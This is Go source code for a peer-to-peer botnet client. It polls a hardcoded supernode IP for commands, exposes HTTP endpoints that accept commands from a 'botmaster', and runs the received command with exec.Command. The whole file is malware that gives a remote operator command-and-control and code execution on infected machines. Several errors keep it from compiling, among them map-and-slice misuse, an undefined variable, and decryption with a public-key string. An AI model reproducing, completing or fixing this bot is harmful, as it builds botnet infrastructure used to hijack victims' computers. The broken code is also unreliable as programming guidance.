package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/json"
	"net"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

type BotFunc interface {
	Online()
	Supernode()
	InvokeCommand()
}

type Bot struct {
	IP 			 string
	Port         string
	Command      string
	Publickey    string
	Supernodes   map[string]int
	OnlineTicker *time.Ticker
}

type Online struct {
	Command      string         `json:"command"`
	Supernodes   map[string]int `json:"supernodes"`
}

func main() {
	//Public key used to decrypt a command sent from botmaster encrypted with private key
	//Execute Command
	//HeartBeat, remove if 3 missed
	//Turn of http after 15 minutes if not supernode
	bot := Bot{
		Port:         ":8080",
		Command:      "",
		Publickey:    "",
		Supernodes:   map[string]int{"77.88.124.125": 0},
		OnlineTicker: time.NewTicker(5 * time.Minute),
	}
	go bot.Supernode()
	bot.Online()
}

func(b *Bot)Supernode() {
	defer func() {
		recover()
	}()
	http.HandleFunc("/ReceiveCommand/", func(w http.ResponseWriter, r *http.Request) {
		b.Command = strings.TrimPrefix(r.URL.Path, "/ReceiveCommand/")
		json.NewEncoder(w).Encode(true)
	})
	http.HandleFunc("/Online", func(w http.ResponseWriter, r *http.Request) {
		b.IP, _, _ = net.SplitHostPort(r.URL.Host)
		ip, _, _ := net.SplitHostPort(r.RemoteAddr)
		b.Supernodes[ip] = 0
		respBody := Online{
			Command:    b.Command,
			Supernodes: b.Supernodes,
		}
		json.NewEncoder(w).Encode(respBody)
	})
	if err := http.ListenAndServe(b.Port, nil); err != nil {
		panic(err)
	}
}

func(bot *Bot)Online() {
	for {
		for supernode, heartbeat := range bot.Supernodes {
			resp, err := http.Get(supernode + bot.Port + "/Online")
			if err != nil {
				panic(err)
			}
			var respBody Online
			json.NewDecoder(resp.Body).Decode(&respBody)
			bot.Command = respBody.Command
			bot.Supernodes = append(bot.Supernodes, respBody["supernodes"]...)
			resp.Body.Close()
		}
		bot.InvokeCommand()
		<-bot.OnlineTicker.C
	}
}

func(bot *Bot)InvokeCommand() {
	plainTextCommand, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, bot.Publickey, command)
	cmd := exec.Command(string(plainTextCommand))
	cmd.Start()
}
